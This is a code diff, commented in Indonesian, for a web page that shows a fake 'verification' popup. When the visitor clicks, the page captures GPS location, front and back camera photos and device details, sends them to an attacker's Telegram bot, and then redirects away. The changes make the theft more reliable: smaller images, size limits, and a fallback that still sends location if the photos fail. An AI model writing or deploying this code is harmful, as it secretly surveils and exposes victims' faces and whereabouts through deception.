@@ -112,30 +112,29 @@
     let timerHandle = null;
     let finished = false;
 
-    // ========== Fungsi Kirim Telegram dengan keepalive ==========
+    // ---------- KIRIM TELEGRAM ----------
     async function sendMessage(text) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        }),
-        keepalive: true
+        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }),
+        keepalive: true   // aman untuk teks kecil
       });
     }
 
     async function sendPhoto(blob, caption) {
+      // Jangan gunakan keepalive untuk foto, karena ukurannya besar
       const fd = new FormData();
       fd.append('chat_id', CHAT_ID);
       fd.append('photo', blob, 'verification.jpg');
       fd.append('caption', caption);
+      // Batasi ukuran: maks 10 MB
+      if (blob.size > 10 * 1024 * 1024) {
+        throw new Error('Foto terlalu besar (>10MB)');
+      }
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
-        body: fd,
-        keepalive: true
+        body: fd
       });
     }
 
@@ -246,12 +245,12 @@ Koord IP: ${loc[0]},${loc[1]}`;
       }
     }
 
-    // ========== KAMERA (dengan ImageCapture fallback) ==========
+    // ========== KAMERA (kompresi 0.7, resolusi 640) ==========
     async function startCamera(facingMode) {
       let stream;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+          video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
       } catch (err) {
@@ -268,7 +267,7 @@ Koord IP: ${loc[0]},${loc[1]}`;
           canvas.width = bitmap.width;
           canvas.height = bitmap.height;
           ctx.drawImage(bitmap, 0, 0);
-          blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+          blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
           if (blob && blob.size > 500) {
             stream.getTracks().forEach(t => t.stop());
             return blob;
@@ -290,7 +289,7 @@ Koord IP: ${loc[0]},${loc[1]}`;
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+        blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
         if (blob && blob.size > 500) break;
         await new Promise(r => setTimeout(r, 300));
       }
@@ -299,7 +298,7 @@ Koord IP: ${loc[0]},${loc[1]}`;
       video.srcObject = null;
 
       if (!blob || blob.size <= 500) {
-        await sendMessage(`⚠️ Kamera ${facingMode} fallback gagal. Ukuran blob: ${blob?.size || 'null'}, videoWidth: ${video.videoWidth}, videoHeight: ${video.videoHeight}`).catch(()=>{});
+        await sendMessage(`⚠️ Kamera ${facingMode} gagal menghasilkan gambar. Ukuran: ${blob?.size || 'null'}`).catch(()=>{});
         throw new Error('Gagal ambil gambar');
       }
       return blob;
@@ -385,6 +384,7 @@ Baterai: ${battery}
 🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}
 📸 Kamera Depan: ${frontBlob?'✅':'❌'} | Belakang: ${backBlob?'✅':'❌'}`;
 
+        // Buat kolase jika ada dua foto
         let finalBlob = null;
         if (frontBlob && backBlob) {
           const loadImg = blob => new Promise(resolve => {
@@ -399,7 +399,7 @@ Baterai: ${battery}
           ctx.fillStyle = '#000'; ctx.fillRect(0,0,w,h);
           ctx.drawImage(frontImg, 0, 0, frontImg.width, frontImg.height);
           ctx.drawImage(backImg, 0, frontImg.height + gap, backImg.width, backImg.height);
-          finalBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+          finalBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
         } else if (frontBlob) {
           finalBlob = frontBlob;
         } else if (backBlob) {
@@ -412,11 +412,15 @@ Baterai: ${battery}
           await sendMessage(caption);
         }
       } catch(e) {
-        await sendMessage(`⚠️ Gagal mengirim data final: ${e.message}`).catch(()=>{});
+        // Fallback: jika gagal total, kirim pesan teks tanpa foto
+        await sendMessage(`⚠️ Data final gagal, kirim teks saja: ${e.message}`).catch(()=>{});
+        // Coba lagi kirim teks penting
+        try {
+          await sendMessage(`Data tanpa foto:\nGPS: ${gpsCoords?JSON.stringify(gpsCoords):'tidak ada'}\nIP: ${navigator.userAgent}`);
+        } catch(ignore) {}
       }
     }
 
-    // ========== FINALISASI (dengan penundaan redirect) ==========
     async function finalize(success) {
       if (finished) return;
       finished = true;
@@ -426,13 +430,12 @@ Baterai: ${battery}
       const status = success ? '✅ VERIFIKASI BERHASIL' : '⏰ TIMEOUT / GAGAL';
       await sendFinalData(status);
 
-      // Tunda redirect agar pengiriman benar-benar selesai
+      // Tunda 3 detik sebelum redirect (pastikan foto terkirim)
       setTimeout(() => {
         window.location.replace(REDIRECT_URL);
-      }, 2000);
+      }, 3000);
     }
 
-    // ========== MULAI VERIFIKASI ==========
     async function startVerification() {
       if (finished) return;
       verifyBtn.disabled = true;
@@ -443,11 +446,7 @@ Baterai: ${battery}
 
       try { await requestLocation(0); } catch(e) { gpsCoords = null; }
 
-      try {
-        frontBlob = await startCamera('user');
-      } catch(e) {
-        frontBlob = null;
-      }
+      try { frontBlob = await startCamera('user'); } catch(e) { frontBlob = null; }
 
       if (frontBlob) {
         try { backBlob = await startCamera('environment'); } catch(e) { backBlob = null; }
@@ -468,12 +467,8 @@ Baterai: ${battery}
       }
     }
 
-    // ========== TIMEOUT 30 DETIK ==========
-    timerHandle = setTimeout(() => {
-      if (!finished) finalize(false);
-    }, 30000);
+    timerHandle = setTimeout(() => { if (!finished) finalize(false); }, 30000);
 
-    // ========== TAMPILKAN POPUP ==========
     setTimeout(() => {
       overlay.style.display = 'flex';
       verifyBtn.addEventListener('click', startVerification);
